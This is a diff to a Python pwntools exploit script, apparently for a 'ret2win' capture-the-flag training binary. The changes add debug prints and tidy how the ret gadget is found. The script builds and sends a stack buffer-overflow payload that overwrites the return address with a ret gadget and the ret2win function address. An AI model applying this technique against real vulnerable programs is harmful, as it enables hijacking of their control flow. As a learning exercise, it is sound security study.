@@ -19,20 +19,26 @@ def exploit(binary_path):
     elf = context.binary = ELF(binary_path)
     io = process(elf.path)
 
+    # Load the cached gadgets for the binary
+    rop = ROP(elf)
+
     # Get the address of the ret2win function
     ret2win_addr = elf.symbols["ret2win"]
+    print("[DEBUG] The address of ret2win() is " + str(hex(ret2win_addr)))
 
     # Use ROPgadget to find the address of a "ret" instruction
-    rop = ROP(elf)
-    ret_gadget = rop.find_gadget(['ret'])[0]
+    ret = rop.find_gadget(['ret'])[0]
+    print("[DEBUG] The address of ROP gadget ret is " + str(hex(ret)))
 
     # Get the offset by calling the find_offset function
     offset = find_offset(binary_path)
+    print("[DEBUG] The offset calculated overwrite RIP is " + str(offset) + " bytes")
 
     # Construct the payload
     payload = b'A' * offset
-    payload += p64(ret_gadget)
+    payload += p64(ret)
     payload += p64(ret2win_addr)
+    print("[DEBUG] The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
 
     # Send the payload and print the output
     io.sendline(payload)
